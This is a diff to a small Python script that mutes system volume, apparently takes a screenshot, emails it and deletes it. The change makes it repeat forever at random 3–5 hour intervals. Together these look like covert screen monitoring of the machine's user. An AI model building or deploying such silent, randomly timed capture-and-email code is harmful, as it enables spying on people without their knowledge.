@@ -1,7 +1,8 @@
 import subprocess
-import time
+import random
 
 from emailer import Emailer
+from time import sleep
 from sys import argv
 
 
@@ -27,7 +28,7 @@ def mute_volume():
 
 
 def unmute_volume():
-    time.sleep(0.5)
+    sleep(0.5)
     subprocess.call("osascript -e 'set volume output muted false'", shell=True)
 
 
@@ -46,4 +47,7 @@ def main():
     delete_screenshot()
 
 
-main()
+while True:
+    interval = random.randint(10800, 18000)
+    sleep(interval)
+    main()
